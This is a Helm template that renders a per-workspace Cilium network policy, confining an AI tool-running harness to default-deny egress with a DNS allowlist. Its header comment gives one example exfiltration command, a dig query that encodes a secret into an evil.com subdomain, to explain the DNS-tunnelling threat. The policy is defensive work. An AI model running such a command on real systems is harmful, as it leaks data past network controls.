# Per-workspace harness egress envelope. The harness is semi-adversarial
# (it interprets LLM-driven streams); it reads its kernel in-process
# from a mounted read-only volume. It creates credentialed tool Jobs
# via the kube API and dispatches them in-process. This is the SOLE
# egress policy for each harness — it owns the L4 destinations
# (kube-dns, kube-apiserver, toolset-ctrl, relay-ctrl) AND the L7 DNS
# allowlist on kube-dns. Default-deny otherwise.
#
# One CNP per workspace: the harness pod carries `sycophant.md/workspace`,
# so ingress can be scoped to THIS workspace's capability-jobs. Cilium has
# no "peer label equals my label" primitive, so the per-workspace scope
# must be rendered, not expressed in a single namespace-wide policy.
#
# The two inbound surfaces sit on two ports because L4 cannot tell two
# gRPC services apart on one port: the relay-forward surface
# (HarnessControl) on 9091 admits relay-ctrl alone; the pod-facing
# dispatch surface on 9090 admits this workspace's capability-jobs alone.
#
# Why a single CNP and not a K8s NetworkPolicy alongside: Cilium's
# documented "L4 shadows L7" merge semantics
# (https://docs.cilium.io/en/stable/security/policy/layer7/) cause a
# K8s NP that allows kube-dns:53 with no L7 rule to silently nullify
# any sibling CNP's L7 DNS allowlist. The proxy redirects the flow but
# evaluates the union ruleset as permissive. Empirically verified on
# Cilium 1.19.3.
#
# The L7 allowlist closes the DNS-tunneling exfil vector: without it, a
# workspace can `dig <base64-secret>.evil.com @kube-dns` and leak data
# through the resolver chain even with no external IP egress reachable.
# Only the two controller hostnames are forwarded; all other DNS
# queries drop at the Cilium L7 proxy before reaching kube-dns.
{{- range $name, $ws := .Values.workspaces }}
---
apiVersion: cilium.io/v2
kind: CiliumNetworkPolicy
metadata:
  name: harness-egress-{{ $name }}
  namespace: {{ $.Release.Namespace }}
  labels:
    {{- include "sycophant.labels" $ | nindent 4 }}
    sycophant.md/workspace: {{ $name }}
spec:
  endpointSelector:
    matchLabels:
      app.kubernetes.io/component: harness
      app.kubernetes.io/part-of: sycophant
      sycophant.md/workspace: {{ $name }}
  egress:
    - toEndpoints:
        - matchLabels:
            io.kubernetes.pod.namespace: kube-system
            k8s-app: kube-dns
      toPorts:
        - ports:
            - port: "53"
              protocol: UDP
            - port: "53"
              protocol: TCP
          rules:
            dns:
              - matchName: "toolset-ctrl.{{ $.Release.Namespace }}.svc.cluster.local"
              - matchName: "relay-ctrl.{{ $.Release.Namespace }}.svc.cluster.local"
    # The harness creates credentialed tool Jobs via the kube API, so it
    # needs egress to the API server. The token is RBAC-scoped to Job
    # creation in this namespace; the capability-job-rbac VAP pins the
    # created Job's service account at admission. Egress is the enabler,
    # not the containment.
    - toEntities:
        - kube-apiserver
      toPorts:
        - ports:
            - port: "6443"
              protocol: TCP
    - toEndpoints:
        - matchLabels:
            app.kubernetes.io/name: toolset-ctrl
            app.kubernetes.io/part-of: sycophant
      toPorts:
        - ports:
            - port: "9090"
              protocol: TCP
    # relay gateway: the harness dials Subscribe (inbound user
    # messages) and DeliverOutbound (reply + turn-state).
    - toEndpoints:
        - matchLabels:
            app.kubernetes.io/name: relay-ctrl
            app.kubernetes.io/part-of: sycophant
      toPorts:
        - ports:
            - port: "9090"
              protocol: TCP
  ingress:
    # Relay forwards registered-user requests to this harness's relay-forward
    # surface (HarnessControl) on 9091. Relay-ctrl serves every workspace and
    # routes by verified workspace, so this rule is not workspace-scoped.
    - fromEndpoints:
        - matchLabels:
            app.kubernetes.io/name: relay-ctrl
            app.kubernetes.io/part-of: sycophant
      toPorts:
        - ports:
            - port: "9091"
              protocol: TCP
    # Capability-job pods dial the pod-facing dispatch surface (9090) to
    # receive their tool call. Scoped to THIS workspace's capability-jobs so a
    # compromised tool pod in another workspace cannot reach this harness.
    - fromEndpoints:
        - matchLabels:
            app.kubernetes.io/component: capability-job
            app.kubernetes.io/part-of: sycophant
            sycophant.md/workspace: {{ $name }}
      toPorts:
        - ports:
            - port: "9090"
              protocol: TCP
{{- end }}
